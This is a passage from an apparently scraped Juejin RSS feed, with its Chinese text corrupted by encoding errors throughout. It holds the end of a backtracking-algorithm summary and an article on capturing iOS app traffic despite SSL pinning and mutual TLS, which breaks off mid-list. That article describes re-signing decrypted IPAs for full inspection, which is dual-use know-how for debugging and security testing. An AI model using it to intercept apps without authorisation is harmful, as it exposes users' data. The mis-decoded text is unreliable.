<span class="hljs-comment">// æ’åºåä¸º[1,2,2]ï¼Œè¾“å‡ºå’Œä¸Šé¢ä¸€è‡´ â†’ [[],[1],[1,2],[1,2,2],[2],[2,2]]</span>
</code></pre>
<p><strong>æ˜“é”™ç‚¹ï¼š</strong></p>
<ul>
<li>å»é‡é€»è¾‘å’Œç»„åˆæ€»å’ŒIIç›¸åŒï¼Œä½†å®¹æ˜“å¿˜è®°æ’åº</li>
</ul>
<hr/>
<h3 data-id="heading-28">å››ã€æ€»ç»“</h3>













































































<table><thead><tr><th>åˆ†ç±»</th><th>é¢˜å·&amp;åç§°</th><th>æ ¸å¿ƒè§„åˆ™</th><th>å…³é”®æ“ä½œ</th><th>ç»ˆæ­¢/ä¿å­˜æ¡ä»¶</th><th>å»é‡&amp;å‰ªææŠ€å·§</th></tr></thead><tbody><tr><td><strong>ç»„åˆç±»</strong></td><td>39. ç»„åˆæ€»å’Œ</td><td>1. æ•°å­—å¯é‡å¤é€‰<br/>2. å€™é€‰æ•°ç»„æ— é‡å¤<br/>3. ç»„åˆå’Œä¸ºtarget</td><td>1. é€’å½’å‚æ•°ä¼ <code>i</code>ï¼ˆå…è®¸é‡å¤é€‰å½“å‰æ•°ï¼‰<br/>2. ç”¨<code>startIndex</code>æ§åˆ¶ä¸å›å¤´é€‰</td><td>1. <code>sum === target</code> â†’ ä¿å­˜è·¯å¾„<br/>2. <code>sum &gt; target</code> â†’ å‰ªæè¿”å›</td><td>1. æ’åºï¼ˆ<code>nums.sort</code>ï¼‰æ˜¯å‰ªæå‰æ<br/>2. <code>sum + cur &gt; target</code> â†’ <code>break</code>ï¼ˆåç»­æ•°æ›´å¤§ï¼‰</td></tr><tr><td/><td>40. ç»„åˆæ€»å’Œ II</td><td>1. æ•°å­—ä¸å¯é‡å¤é€‰<br/>2. å€™é€‰æ•°ç»„æœ‰é‡å¤<br/>3. ç»„åˆå’Œä¸ºtarget</td><td>1. é€’å½’å‚æ•°ä¼ <code>i+1</code>ï¼ˆä¸å¯é‡å¤é€‰ï¼‰<br/>2. ç”¨<code>startIndex</code>æ§åˆ¶ä¸å›å¤´é€‰</td><td>1. <code>sum === target</code> â†’ ä¿å­˜è·¯å¾„<br/>2. <code>sum &gt; target</code> â†’ å‰ªæè¿”å›</td><td>1. å…ˆæ’åºï¼ˆè®©é‡å¤æ•°å­—ç›¸é‚»ï¼‰<br/>2. åŒå±‚å»é‡ï¼š<code>i &gt; startIndex &amp;&amp; nums[i] === nums[i-1]</code> â†’ <code>continue</code><br/>3. <code>sum + cur &gt; target</code> â†’ <code>break</code></td></tr><tr><td/><td>77. ç»„åˆ</td><td>1. ä» <code>1~n</code> é€‰ <code>k</code> ä¸ªæ•°å­—<br/>2. æ— é‡å¤ç»„åˆ<br/>3. ä¸è€ƒè™‘é¡ºåº</td><td>1. é€’å½’å‚æ•°ä¼ <code>i+1</code><br/>2. ç”¨<code>startIndex</code>æ§åˆ¶ä¸å›å¤´é€‰</td><td><code>path.length === k</code> â†’ ä¿å­˜è·¯å¾„</td><td>å‰ªæï¼š<code>path.length + (n - startIndex + 1) &lt; k</code> â†’ å‰ªæï¼ˆå‰©ä½™æ•°ä¸å¤Ÿå‡‘kä¸ªï¼‰</td></tr><tr><td/><td>216. ç»„åˆæ€»å’Œ III</td><td>1. ä» <code>1~9</code> é€‰ <code>k</code> ä¸ªæ•°å­—<br/>2. æ•°å­—ä¸å¯é‡å¤é€‰<br/>3. ç»„åˆå’Œä¸º<code>n</code></td><td>1. é€’å½’å‚æ•°ä¼ <code>i+1</code><br/>2. ç”¨<code>startIndex</code>æ§åˆ¶ä¸å›å¤´é€‰</td><td><code>path.length === k</code> <strong>ä¸”</strong> <code>sum === n</code> â†’ ä¿å­˜è·¯å¾„</td><td>1. 1~9å¤©ç„¶æœ‰åºï¼Œæ— éœ€æ’åº<br/>2. <code>sum + cur &gt; n</code> â†’ <code>break</code><br/>3. å‰©ä½™æ•°å‰ªæï¼ˆåŒ77é¢˜ï¼‰</td></tr><tr><td><strong>æ’åˆ—ç±»</strong></td><td>46. å…¨æ’åˆ—</td><td>1. å€™é€‰æ•°ç»„æ— é‡å¤<br/>2. ç”Ÿæˆæ‰€æœ‰æ’åˆ—ï¼ˆè€ƒè™‘é¡ºåºï¼‰</td><td>1. ç”¨<code>used</code>æ•°ç»„æ ‡è®°å·²é€‰æ•°å­—<br/>2. éå†èŒƒå›´<code>0~len-1</code>ï¼ˆæ— <code>startIndex</code>ï¼‰</td><td><code>path.length === len</code> â†’ ä¿å­˜è·¯å¾„</td><td>æ— éœ€å»é‡ï¼Œä»…ç”¨<code>used[i]</code> â†’ <code>continue</code>ï¼ˆè·³è¿‡å·²é€‰æ•°å­—ï¼‰</td></tr><tr><td/><td>47. å…¨æ’åˆ— II</td><td>1. å€™é€‰æ•°ç»„æœ‰é‡å¤<br/>2. ç”Ÿæˆæ— é‡å¤æ’åˆ—ï¼ˆè€ƒè™‘é¡ºåºï¼‰</td><td>1. ç”¨<code>used</code>æ•°ç»„æ ‡è®°å·²é€‰æ•°å­—<br/>2. éå†èŒƒå›´<code>0~len-1</code>ï¼ˆæ— <code>startIndex</code>ï¼‰</td><td><code>path.length === len</code> â†’ ä¿å­˜è·¯å¾„</td><td>1. å…ˆæ’åºï¼ˆè®©é‡å¤æ•°å­—ç›¸é‚»ï¼‰<br/>2. åŒå±‚å»é‡ï¼š<code>i &gt; 0 &amp;&amp; nums[i] === nums[i-1] &amp;&amp; !used[i-1]</code> â†’ <code>continue</code><br/>3. <code>used[i]</code> â†’ <code>continue</code>ï¼ˆè·³è¿‡å·²é€‰æ•°å­—ï¼‰</td></tr><tr><td><strong>å­é›†ç±»</strong></td><td>78. å­é›†</td><td>1. å€™é€‰æ•°ç»„æ— é‡å¤<br/>2. ç”Ÿæˆæ‰€æœ‰å­é›†ï¼ˆå«ç©ºé›†ï¼‰<br/>3. ä¸è€ƒè™‘é¡ºåº</td><td>1. é€’å½’å‚æ•°ä¼ <code>i+1</code><br/>2. ç”¨<code>startIndex</code>æ§åˆ¶ä¸å›å¤´é€‰</td><td><strong>è¿›å…¥é€’å½’å°±ä¿å­˜è·¯å¾„</strong>ï¼ˆæ‰€æœ‰è·¯å¾„éƒ½æ˜¯æœ‰æ•ˆå­é›†ï¼‰</td><td>æ— éœ€å»é‡ï¼Œæ— å‰ªæï¼ˆå­é›†æ— é•¿åº¦/å’Œé™åˆ¶ï¼‰</td></tr><tr><td/><td>90. å­é›† II</td><td>1. å€™é€‰æ•°ç»„æœ‰é‡å¤<br/>2. ç”Ÿæˆæ— é‡å¤å­é›†ï¼ˆå«ç©ºé›†ï¼‰<br/>3. ä¸è€ƒè™‘é¡ºåº</td><td>1. é€’å½’å‚æ•°ä¼ <code>i+1</code><br/>2. ç”¨<code>startIndex</code>æ§åˆ¶ä¸å›å¤´é€‰</td><td><strong>è¿›å…¥é€’å½’å°±ä¿å­˜è·¯å¾„</strong>ï¼ˆæ‰€æœ‰è·¯å¾„éƒ½æ˜¯æœ‰æ•ˆå­é›†ï¼‰</td><td>1. å…ˆæ’åºï¼ˆè®©é‡å¤æ•°å­—ç›¸é‚»ï¼‰<br/>2. åŒå±‚å»é‡ï¼š<code>i &gt; startIndex &amp;&amp; nums[i] === nums[i-1]</code> â†’ <code>continue</code></td></tr></tbody></table>
<ul>
<li><strong>æ’åº</strong>ï¼šåªè¦æ¶‰åŠâ€œå»é‡/å‰ªæâ€ï¼Œç¬¬ä¸€æ­¥å¿…æ’åºï¼ˆè®©é‡å¤æ•°å­—ç›¸é‚»ã€è®©æ•°å­—é€’å¢ä¾¿äºsumå‰ªæï¼‰ï¼›</li>
<li><strong>æ·±æ‹·è´</strong>ï¼šæ‰€æœ‰é¢˜éƒ½éœ€è¦<code>res.push([...path])</code>ï¼Œç›´æ¥push(path)ä¼šå› å¼•ç”¨å¯¼è‡´ç»“æœé”™è¯¯ï¼›</li>
<li><strong>å›æº¯é—­ç¯</strong>ï¼šé€‰æ•°å­—ï¼ˆpushï¼‰â†’ é€’å½’ â†’ æ’¤é”€é€‰ï¼ˆpopï¼‰ï¼Œå¿ƒæ˜¯"é€‰â†’æ¢â†’æ’¤"ï¼Œç¼ºä¸€ä¸å¯ã€‚</li>
<li><strong>æ¨¡æ¿å¤ç”¨</strong>ï¼š
<ul>
<li>ç»„åˆ/å­é›†ï¼šç”¨<code>start</code>å‚æ•°é¿å…é‡å¤ï¼Œå¾ªç¯ä»<code>start</code>å¼€å§‹</li>
<li>æ’åˆ—ï¼šç”¨<code>used</code>æ•°ç»„é¿å…é‡å¤é€‰ï¼Œå¾ªç¯ä»0å¼€å§‹=</li>
</ul>
</li>
<li>å»é‡å‰ªæçš„â€œé»„é‡‘å…¬å¼â€
<ul>
<li><strong>ç»„åˆ/å­é›†å»é‡</strong>ï¼ˆæœ‰é‡å¤æ•°å­—ï¼‰ï¼š<code>i &gt; startIndex &amp;&amp; nums[i] === nums[i-1]</code>ï¼›</li>
<li><strong>æ’åˆ—å»é‡</strong>ï¼ˆæœ‰é‡å¤æ•°å­—ï¼‰ï¼š<code>i &gt; 0 &amp;&amp; nums[i] === nums[i-1] &amp;&amp; !used[i-1]</code>ï¼›</li>
<li><strong>sumå‰ªæ</strong>ï¼ˆæ‰€æœ‰æ±‚å’Œç±»é—®é¢˜ï¼‰ï¼š<code>sum + cur &gt; target</code> â†’ breakï¼ˆéœ€å…ˆæ’åºï¼‰ã€‚</li>
</ul>
</li>
</ul>
<p>è®°ä½â€œç»„åˆçœ‹startã€æ’åˆ—çœ‹usedã€å­é›†å…¨ä¿å­˜â€çš„å£è¯€ï¼Œå°±èƒ½å¿«é€Ÿé€‚é…æ‰€æœ‰è¿™ç±»å›æº¯é—®é¢˜ï½</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[è®¾ç½®äº† SSL Pinning ä¸åŒå‘ TLS éªŒè¯è¦æ€ä¹ˆæŠ“åŒ…]]></title>    <link>https://juejin.cn/post/7597168034618081299</link>    <guid>https://juejin.cn/post/7597168034618081299</guid>    <pubDate>2026-01-20T09:20:24.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597168034618081299" data-draft-id="7597250364124446783" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="è®¾ç½®äº† SSL Pinning ä¸åŒå‘ TLS éªŒè¯è¦æ€ä¹ˆæŠ“åŒ…"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2026-01-20T09:20:24.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æˆ‘æ˜¯è°çš„ç¨‹åºå‘˜"/> <meta itemprop="url" content="https://juejin.cn/user/2390811467846089"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            è®¾ç½®äº† SSL Pinning ä¸åŒå‘ TLS éªŒè¯è¦æ€ä¹ˆæŠ“åŒ…
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2390811467846089/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æˆ‘æ˜¯è°çš„ç¨‹åºå‘˜
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T09:20:24.000Z" title="Tue Jan 20 2026 09:20:24 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>å¾ˆå¤šäººç¬¬ä¸€æ¬¡é‡åˆ°å¸¦ <strong>PINï¼ˆè¯ä¹¦ç»‘å®šï¼‰æˆ–åŒå‘ TLS éªŒè¯</strong>çš„ App æ—¶ï¼Œéƒ½ä¼šå¡åœ¨ä¸€ä¸ªé˜¶æ®µï¼Œ
ä»£ç†è¯ä¹¦è£…å¥½äº†ï¼ŒWi-Fi ä»£ç†ä¹Ÿç”Ÿæ•ˆäº†ï¼Œä½†è¯·æ±‚å°±æ˜¯æ¶ˆå¤±äº†ã€‚</p>
<p>è¿™å¹¶ä¸æ˜¯é…ç½®é—®é¢˜ï¼Œè€Œæ˜¯ç½‘ç»œè·¯å¾„å·²ç»å‘ç”Ÿäº†å˜åŒ–ã€‚</p>
<hr/>
<h2 data-id="heading-0"><strong>ä¸ºä»€ä¹ˆ PIN + åŒå‘éªŒè¯ä¼šç›´æ¥ææ–­ä»£ç†æŠ“åŒ…</strong></h2>
<p>åœ¨æ™®é€š HTTPS ä»£ç†æŠ“åŒ…é‡Œï¼ŒæŠ“åŒ…å·¥å…·æœ¬è´¨ä¸Šæ‰®æ¼”çš„æ˜¯ ä¸­é—´äºº ã€‚
å®¢æˆ·ç«¯ä¿¡ä»»ç³»ç»Ÿè¯ä¹¦ â†’ ä»£ç†è¯ä¹¦è¢«æ¥å— â†’ TLS èƒ½æ­£å¸¸å»ºç«‹ã€‚</p>
<p>ä½†ä¸€æ—¦ App åšäº†ä¸‹é¢ä»»æ„ä¸€ä»¶äº‹ï¼š</p>
<ul>
<li>åœ¨ä»£ç é‡Œå›ºå®šæœåŠ¡ç«¯è¯ä¹¦æˆ–å…¬é’¥</li>
<li>æ ¡éªŒå®¢æˆ·ç«¯è¯ä¹¦ï¼ˆmTLSï¼‰</li>
<li>å¯¹è¯ä¹¦é“¾åšé¢å¤–æ ¡éªŒ</li>
</ul>
<p>ç³»ç»Ÿä¿¡ä»»é“¾è¿™æ¡è·¯å°±ä¸å†æˆç«‹ã€‚
è¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆ Charlesã€Fiddler è¿™ç±»å·¥å…·ï¼Œåœ¨è¿™äº› App ä¸Šä¼šç›´æ¥å˜æˆä»€ä¹ˆéƒ½æ²¡æœ‰ã€‚</p>
<hr/>
<h2 data-id="heading-1"><strong>æˆ‘ä¸€èˆ¬ä¸ä¼šä¸€å¼€å§‹å°±çº ç»“æ€ä¹ˆç»•è¿‡</strong></h2>
<p>åœ¨çœŸå®é¡¹ç›®ç¯å¢ƒé‡Œï¼Œæˆ‘å¾ˆå°‘ä¸€ä¸Šæ¥å°±ç ”ç©¶ PIN æ€ä¹ˆç»•ã€‚
æˆ‘æ›´å…³å¿ƒçš„æ˜¯ï¼š<strong>æœ‰æ²¡æœ‰åˆ«çš„æŠ“åŒ…æ–¹å¼ï¼Œèƒ½å…ˆè®©æˆ‘çœ‹åˆ°çœŸå®è¯·æ±‚ã€‚</strong></p>
<hr/>
<h2 data-id="heading-2"><strong>ä»ä»£ç†åˆ‡æ¢åˆ° HTTPS æš´åŠ›æŠ“åŒ…ï¼Œæ˜¯ä¸€ä¸ªæ˜æ˜¾çš„åˆ†æ°´å²­</strong></h2>
<p>åœ¨è¿™ç±»åœºæ™¯ä¸‹ï¼Œæˆ‘ä¼šç›´æ¥ä½¿ç”¨æŠ“åŒ…å¤§å¸ˆçš„ <strong>HTTPS æš´åŠ›æŠ“åŒ…</strong> æ¨¡å¼ï¼Œè€Œä¸æ˜¯ç»§ç»­åœ¨ä»£ç†æ¨¡å¼ä¸Šæ¶ˆè€—æ—¶é—´ã€‚</p>
<p>è¿™ä¸ªæ¨¡å¼æœ‰å‡ ä¸ªå…³é”®å·®å¼‚ç‚¹ï¼š</p>
<ul>
<li>ä¸ä¾èµ–ç³»ç»Ÿä»£ç†</li>
<li>ä¸éœ€è¦åœ¨ iOS ä¸Šå®‰è£…æˆ–ä¿¡ä»»è¯ä¹¦</li>
<li>è¯·æ±‚åœ¨æ›´é è¿‘ App çš„ä½ç½®è¢«æ¥ç®¡</li>
</ul>
<p>è¿™æ„å‘³ç€ï¼Œå³ä½¿ App å¼€å¯äº† PIN æˆ–åŒå‘éªŒè¯ï¼Œä¹Ÿä¸ä¼šåœ¨ TLS é˜¶æ®µæŠŠä½ æŒ¡åœ¨é—¨å¤–ã€‚</p>
<hr/>
<h2 data-id="heading-3"><strong>æˆ‘å®é™…æ“ä½œæ—¶çš„å®Œæ•´å‡†å¤‡æµç¨‹</strong></h2>
<p>è¿™é‡Œä¸æ˜¯ç†è®ºå¯è¡Œï¼Œè€Œæ˜¯æˆ‘å®é™…ä¼šç…§ç€èµ°çš„ä¸€å¥—æµç¨‹ã€‚</p>
<h3 data-id="heading-4">è®¾å¤‡å‡†å¤‡é˜¶æ®µ</h3>
<ul>
<li>ç”¨ USB å°† iPhone è¿æ¥åˆ°ç”µè„‘ï¼Œç¡®ä¿è§£é”ã€äº®å±</li>
<li>ç¬¬ä¸€æ¬¡è¿æ¥æ—¶ï¼Œåœ¨æ‰‹æœºä¸Šç‚¹â€œä¿¡ä»»æ­¤ç”µè„‘â€</li>
<li>Windows ä¸‹æŒ‰æç¤ºå®‰è£… iOS é©±åŠ¨ï¼Œå®Œæˆåé‡å¯æŠ“åŒ…å¤§å¸ˆ</li>
<li>æŒ‰æç¤ºåœ¨æ‰‹æœºä¸Šå®‰è£…æè¿°æ–‡ä»¶</li>
<li>å¦‚æœæ˜¯ iOS 17.4 åŠä»¥åç³»ç»Ÿï¼ŒæŒ‰æç¤ºå¼€å¯å¼€å‘è€…æ¨¡å¼</li>
</ul>
<p>è¿™äº›æ­¥éª¤çœ‹èµ·æ¥çç¢ï¼Œä½†ä»»ä½•ä¸€æ­¥æ²¡å®Œæˆï¼Œåé¢çš„æš´åŠ›æŠ“åŒ…éƒ½èµ·ä¸æ¥ã€‚</p>
<hr/>
<h2 data-id="heading-5"><strong>è¿›å…¥ HTTPS æš´åŠ›æŠ“åŒ…æ—¶ï¼Œæˆ‘ä¼šå…ˆè§‚å¯Ÿä¸€ä¸ªçŠ¶æ€</strong></h2>
<p>åœ¨è®¾å¤‡åˆ—è¡¨ä¸­é€‰ä¸­ iOS è®¾å¤‡åï¼Œæˆ‘ä¸ä¼šç«‹åˆ»ç‚¹åŠŸèƒ½æŒ‰é’®ï¼Œè€Œæ˜¯å…ˆçœ‹å·¦ä¸‹è§’ï¼š</p>
<ul>
<li>â€œé«˜çº§ç®¡ç†æœåŠ¡â€æ˜¯å¦å·²ç»å˜æˆç»¿è‰²</li>
<li>å¦‚æœæ²¡æœ‰ï¼Œæ‰‹åŠ¨ç‚¹å‡»å¯åŠ¨ï¼Œå¹¶ç¡®è®¤ç³»ç»Ÿæƒé™æç¤ºæ˜¯å¦å¼¹å‡º</li>
</ul>
<p>è¿™ä¸ªçŠ¶æ€æ²¡èµ·æ¥ï¼Œæš´åŠ›æŠ“åŒ…ç•Œé¢å†æ€ä¹ˆç‚¹éƒ½åªæ˜¯ç©ºæ“ä½œã€‚</p>
<hr/>
<h2 data-id="heading-6"><strong>çœŸæ­£å¼€å§‹æŠ“çš„æ—¶å€™ï¼Œæˆ‘ä¼šå…ˆé™åˆ¶èŒƒå›´</strong></h2>
<p>è¿›å…¥ HTTPS æš´åŠ›æŠ“åŒ…æ¨¡å¼åï¼Œæˆ‘ç¬¬ä¸€ä»¶äº‹ä¸æ˜¯ç‚¹â€œå¼€å§‹â€ï¼Œè€Œæ˜¯ï¼š</p>
<ul>
<li>æ‰“å¼€ã€Œé€‰æ‹© Appã€ï¼Œåªå‹¾é€‰ç›®æ ‡åº”ç”¨</li>
<li>è®¾ç½®åŸºæœ¬è¿‡æ»¤æ¡ä»¶ï¼Œé¿å…èƒŒæ™¯æµé‡å¹²æ‰°</li>
</ul>
<p>è¿™æ ·åšçš„å¥½å¤„å¾ˆç›´æ¥ï¼š
å½“ App å‘èµ·è¯·æ±‚æ—¶ï¼Œä½ èƒ½æ¸…æ¥šçœ‹åˆ°å“ªä¸€æ¡æ˜¯å®ƒäº§ç”Ÿçš„ï¼Œè€Œä¸æ˜¯è¢«ç³»ç»Ÿæµé‡æ·¹æ²¡ã€‚</p>
<hr/>
<h2 data-id="heading-7"><strong>èƒ½æŠ“åˆ° â‰  ä»€ä¹ˆéƒ½èƒ½çœ‹ï¼Œè¿™æ˜¯å¾ˆå¤šäººå®¹æ˜“è¯¯è§£çš„åœ°æ–¹</strong></h2>
<p>å³ä¾¿åœ¨æš´åŠ›æŠ“åŒ…æ¨¡å¼ä¸‹ï¼Œä¹Ÿå­˜åœ¨ä¸€ä¸ªå‰ææ¡ä»¶ï¼š<strong>App æ˜¯å¦ä½¿ç”¨ iOS å¼€å‘è¯ä¹¦ç­¾åã€‚</strong></p>
<p>åœ¨æˆ‘çš„å®é™…ç»éªŒä¸­ï¼Œå¸¸è§æƒ…å†µæ˜¯ï¼š</p>
<ul>
<li>è‡ªç­¾æˆ–é‡ç­¾ Appï¼šè¯·æ±‚ä½“ã€å“åº”ä½“éƒ½èƒ½çœ‹åˆ°</li>
<li>App Store åŸåŒ…æˆ–ç³»ç»Ÿ Appï¼šåªèƒ½çœ‹åˆ° URL å’Œ Header</li>
</ul>
<p>è¿™ä¸æ˜¯å·¥å…·é™åˆ¶ï¼Œè€Œæ˜¯ iOS çš„å®‰å…¨æ¨¡å‹æœ¬èº«å†³å®šçš„ã€‚</p>
<hr/>
<h2 data-id="heading-8"><strong>å½“æˆ‘åªèƒ½çœ‹åˆ° Header æ—¶ï¼Œä»ç„¶æœ‰ä»·å€¼çš„å‡ ä»¶äº‹</strong></h2>
<p>å³ä¾¿ body ä¸å¯è§ï¼Œæˆ‘ä»ç„¶ä¼šåšå‡ ä»¶åˆ¤æ–­ï¼š</p>
<ul>
<li>è¯·æ±‚æ˜¯å¦å‘½ä¸­é¢„æœŸåŸŸå</li>
<li>Header ä¸­æ˜¯å¦æºå¸¦ç‰¹å®šæ ‡è¯†</li>
<li>TLS å»ºè¿æ˜¯å¦æˆåŠŸã€æ˜¯å¦é¢‘ç¹é‡è¯•</li>
</ul>
<p>è¿™äº›ä¿¡æ¯è¶³ä»¥åˆ¤æ–­ App æ˜¯å¦åœ¨æŒ‰é¢„æœŸå·¥ä½œï¼Œå°¤å…¶åœ¨è°ƒè¯•ç½‘ç»œå¼‚å¸¸æ—¶éå¸¸æœ‰ç”¨ã€‚</p>
<hr/>
<h2 data-id="heading-9"><strong>å¦‚æœç¡®å®éœ€è¦å®Œæ•´å†…å®¹ï¼Œæˆ‘ä¼šæ€ä¹ˆå¤„ç†</strong></h2>
<p>åœ¨éœ€è¦å®Œæ•´è¯·æ±‚ä½“çš„æƒ…å†µä¸‹ï¼Œæˆ‘é€šå¸¸ä¼šï¼š</p>
<ul>
<li>è·å–ç›®æ ‡ App çš„ IPA</li>
<li>ä½¿ç”¨ iOS å¼€å‘è¯ä¹¦é‡æ–°ç­¾å</li>
<li>ç¡®ä¿ä½¿ç”¨çš„æ˜¯å·²è„±å£³ç‰ˆæœ¬</li>
</ul>
<p>å®Œæˆåï¼Œå†é€šè¿‡ HTTPS æš´åŠ›æŠ“åŒ…é‡æ–°æŠ“å–ã€‚
è¿™ä¸€æ­¥æˆæœ¬ä¸ä½ï¼Œä½†å®ƒæ˜¯å”¯ä¸€ç¨³å®šå¯æ§çš„è·¯å¾„ã€‚
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/658b9882234d4b63bab753716ff79519~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oiR5piv6LCB55qE56iL5bqP5ZGY:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769505624&amp;x-signature=e6s%2FxkjEm%2FKl4mcpLXcZ51quMPs%3D" alt="httpsæš´åŠ›æŠ“åŒ…" loading="lazy"/></p>
<hr/>
<p>åœ¨ PIN å’ŒåŒå‘éªŒè¯åœºæ™¯ä¸‹ï¼Œæˆ‘å¸¸ç”¨çš„ç»„åˆæ˜¯ï¼š</p>
<ul>
